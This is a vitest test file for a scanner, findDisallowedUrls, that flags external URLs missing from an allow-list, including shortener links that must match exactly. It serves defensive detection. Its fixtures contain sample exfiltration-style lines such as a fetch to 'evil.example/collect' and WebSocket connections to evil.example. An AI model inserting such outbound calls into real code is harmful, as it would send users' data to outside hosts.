import { describe, expect, it } from 'vitest';
import { findDisallowedUrls } from '../../scripts/lib/external-urls.mjs';

describe('findDisallowedUrls', () => {
  it('flags http and https URLs that are not allow-listed', () => {
    const text = 'fetch("https://evil.example/collect?x=1"); img.src=\'http://cdn.example/a.png\'';
    expect(findDisallowedUrls(text, [])).toEqual([
      'https://evil.example/collect?x=1',
      'http://cdn.example/a.png',
    ]);
  });

  it('ignores allow-listed prefixes', () => {
    const text = 'ns="http://www.w3.org/2000/svg" msg="https://react.dev/errors/418"';
    expect(findDisallowedUrls(text, ['http://www.w3.org/', 'https://react.dev/errors/'])).toEqual(
      [],
    );
  });

  it('reports each URL once', () => {
    expect(findDisallowedUrls('https://a.example https://a.example', [])).toEqual([
      'https://a.example',
    ]);
  });

  it('returns nothing for text without URLs', () => {
    expect(findDisallowedUrls('const a = 1;', [])).toEqual([]);
  });

  it('flags ws and wss URLs', () => {
    const text =
      'new WebSocket("ws://evil.example/live"); new WebSocket(`wss://evil.example/secure`)';
    expect(findDisallowedUrls(text, [])).toEqual([
      'ws://evil.example/live',
      'wss://evil.example/secure',
    ]);
  });

  it('flags protocol-relative URLs inside double quotes, single quotes and backticks', () => {
    const text =
      's.src="//cdn.example/x.js"; i.src=\'//img.example/p.png\'; u=`//api.example:8443/v1?q=1`';
    expect(findDisallowedUrls(text, [])).toEqual([
      '//cdn.example/x.js',
      '//img.example/p.png',
      '//api.example:8443/v1?q=1',
    ]);
  });

  it('ignores // that is not a quoted protocol-relative URL', () => {
    expect(
      findDisallowedUrls('a = b; // see foo.example for details\nx = "//"; y = "// note.txt"', []),
    ).toEqual([]);
  });

  it('treats an allow-list entry ending in / as a prefix', () => {
    expect(
      findDisallowedUrls('"https://react.dev/errors/418"', ['https://react.dev/errors/']),
    ).toEqual([]);
  });

  it('requires any other allow-list entry to equal the whole URL', () => {
    const text = '`http://bit.ly/2kdckMn` `http://bit.ly/2kdckMnEVIL` `http://bit.ly/2kdckMn/x`';
    expect(findDisallowedUrls(text, ['http://bit.ly/2kdckMn'])).toEqual([
      'http://bit.ly/2kdckMnEVIL',
      'http://bit.ly/2kdckMn/x',
    ]);
  });

  it('the default allow-list keeps the shortener entries exact', () => {
    expect(findDisallowedUrls('`https://tinyurl.com/y2uuvskb` `http://bit.ly/2kdckMn`')).toEqual(
      [],
    );
    expect(findDisallowedUrls('`https://tinyurl.com/y2uuvskbX`')).toEqual([
      'https://tinyurl.com/y2uuvskbX',
    ]);
  });
});
